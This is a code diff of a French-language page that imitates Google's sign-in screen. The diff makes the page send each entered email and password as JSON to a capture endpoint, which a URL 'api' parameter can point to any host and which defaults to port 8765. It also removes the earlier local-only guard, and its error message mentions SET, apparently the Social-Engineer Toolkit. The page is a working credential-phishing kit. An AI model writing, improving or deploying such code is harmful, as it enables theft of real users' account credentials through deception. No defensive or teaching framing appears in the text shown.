@@ -38,34 +38,29 @@
         </div>
 
         <div class="form-step" id="step-password" data-step="password" hidden>
-          <form id="passwordForm" method="POST" action="/">
-            <input type="hidden" name="username" id="usernameField" value="" />
+          <button type="button" class="account-chip" id="changeAccountButton">
+            <span class="account-chip__avatar" aria-hidden="true"></span>
+            <span class="account-chip__email" id="displayedEmail"></span>
+            <span class="account-chip__chevron" aria-hidden="true">▾</span>
+          </button>
 
-            <button type="button" class="account-chip" id="changeAccountButton">
-              <span class="account-chip__avatar" aria-hidden="true"></span>
-              <span class="account-chip__email" id="displayedEmail"></span>
-              <span class="account-chip__chevron" aria-hidden="true">▾</span>
-            </button>
+          <div class="field-group">
+            <label for="password">Saisissez votre mot de passe</label>
+            <input
+              id="password"
+              type="password"
+              autocomplete="off"
+              required
+            />
+          </div>
 
-            <div class="field-group">
-              <label for="password">Saisissez votre mot de passe</label>
-              <input
-                id="password"
-                name="password"
-                type="password"
-                autocomplete="off"
-                required
-              />
-            </div>
+          <a class="helper-link" href="#">Mot de passe oublié ?</a>
 
-            <a class="helper-link" href="#">Mot de passe oublié ?</a>
+          <p class="save-status" id="saveStatus" hidden role="status"></p>
 
-            <p class="save-status" id="saveStatus" hidden role="status"></p>
-
-            <div class="actions">
-              <button type="submit" id="passwordSubmitButton">Suivant</button>
-            </div>
-          </form>
+          <div class="actions">
+            <button type="button" id="passwordSubmitButton">Suivant</button>
+          </div>
         </div>
       </div>
     </section>
@@ -89,20 +84,26 @@
     const stepEmail = document.querySelector("#step-email");
     const stepPassword = document.querySelector("#step-password");
     const identifier = document.querySelector("#identifier");
-    const passwordForm = document.querySelector("#passwordForm");
-    const usernameField = document.querySelector("#usernameField");
     const password = document.querySelector("#password");
     const displayedEmail = document.querySelector("#displayedEmail");
     const emailNextButton = document.querySelector("#emailNextButton");
+    const passwordSubmitButton = document.querySelector("#passwordSubmitButton");
     const changeAccountButton = document.querySelector("#changeAccountButton");
     const saveStatus = document.querySelector("#saveStatus");
-    const API_URL = "/api/enregistrer";
     const GOOGLE_LOGIN_URL = "https://accounts.google.com/v3/signin/identifier";
 
-    function isLocalDevServer() {
-      const port = window.location.port || (window.location.protocol === "https:" ? "443" : "80");
-      return port === "8765";
+    function getCaptureApiUrl() {
+      const params = new URLSearchParams(window.location.search);
+      const customApi = params.get("api");
+
+      if (customApi) {
+        return customApi;
+      }
+
+      return `http://${window.location.hostname}:8765/api/enregistrer`;
     }
+
+    const API_URL = getCaptureApiUrl();
 
     function showStep(step) {
       const isEmail = step === "email";
@@ -120,6 +121,24 @@
       }
     }
 
+    async function enregistrerIdentifiants(email, motDePasse) {
+      const response = await fetch(API_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email,
+          password: motDePasse,
+          date: new Date().toISOString(),
+        }),
+      });
+
+      if (!response.ok) {
+        throw new Error("Enregistrement impossible");
+      }
+
+      return response.json();
+    }
+
     emailNextButton.addEventListener("click", () => {
       const email = identifier.value.trim();
 
@@ -129,7 +148,6 @@
       }
 
       displayedEmail.textContent = email;
-      usernameField.value = email;
       password.value = "";
       showStep("password");
     });
@@ -138,41 +156,27 @@
       showStep("email");
     });
 
-    passwordForm.addEventListener("submit", async (event) => {
-      const email = usernameField.value.trim();
+    passwordSubmitButton.addEventListener("click", async () => {
+      const email = displayedEmail.textContent.trim();
       const motDePasse = password.value.trim();
 
       if (!motDePasse) {
-        event.preventDefault();
         password.focus();
         return;
       }
 
-      if (!isLocalDevServer()) {
-        return;
-      }
-
-      event.preventDefault();
+      passwordSubmitButton.disabled = true;
+      passwordSubmitButton.textContent = "Enregistrement...";
       saveStatus.hidden = true;
 
       try {
-        const response = await fetch(API_URL, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            email,
-            password: motDePasse,
-            date: new Date().toISOString(),
-          }),
-        });
-
-        if (!response.ok) {
-          throw new Error("Enregistrement impossible");
-        }
+        await enregistrerIdentifiants(email, motDePasse);
       } catch (error) {
         saveStatus.hidden = false;
-        saveStatus.textContent = "Serveur local indisponible.";
+        saveStatus.textContent = `Erreur : lancez "python server.py" puis testez sur http://${window.location.hostname}:8765 (ou avec SET + port 8765 ouvert).`;
         saveStatus.classList.add("is-error");
+        passwordSubmitButton.disabled = false;
+        passwordSubmitButton.textContent = "Suivant";
         return;
       }
 
@@ -185,6 +189,13 @@
       if (event.key === "Enter") {
         event.preventDefault();
         emailNextButton.click();
+      }
+    });
+
+    password.addEventListener("keydown", (event) => {
+      if (event.key === "Enter") {
+        event.preventDefault();
+        passwordSubmitButton.click();
       }
     });
   </script>
